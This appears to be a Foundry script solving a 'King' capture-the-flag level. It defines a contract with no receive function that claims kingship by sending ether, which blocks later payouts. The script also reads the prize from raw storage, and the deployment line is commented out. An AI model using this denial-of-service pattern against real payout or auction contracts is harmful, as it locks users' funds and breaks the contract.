// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Empty {
    constructor(King _kingInstance) payable {
        (bool success,) = address(_kingInstance).call{value: msg.value}("");
        require(success, "failed to become king");
    }
}


contract KingSolution is Script {

    King public kingInstance = King(payable(0xf96Db2bE6E31126Fd86bc6B49FABca293C16bC5D));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 prizeBytes = vm.load(address(kingInstance), bytes32(uint256(1)));
        console.logBytes32(prizeBytes);


        console.logAddress(kingInstance._king());

        // new Empty{value: 0.001 ether}(kingInstance);

        // console.logAddress(kingInstance._king());

        vm.stopBroadcast();
    }
}